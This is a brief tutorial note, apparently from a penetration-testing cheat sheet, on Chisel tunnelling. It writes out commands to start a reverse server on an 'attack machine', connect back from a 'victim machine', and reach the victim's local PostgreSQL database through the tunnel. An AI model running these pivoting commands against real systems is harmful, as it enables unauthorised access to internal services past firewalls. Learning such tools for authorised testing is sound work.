Chisel
***************

Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Written in Go (golang). Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network.

Host A Reverse Server
##########################

This is on the attack machine. This specifies the port the victim will listen to. The port can be any port number.

.. code-block:: console

   chisel server –p 1234 --reverse 

This is on the victim machine. We are trying to get it to listen to port 4321.

.. code-block:: console

        ./chisel_amd64_linux client <serverIP>:<serverPort> R:4321:localhost:4321

Back on the attacker machine we can now run the follwoing command to connect

.. code-block:: console

   psql -h 127.0.0.1 -p 4321 -U profiles
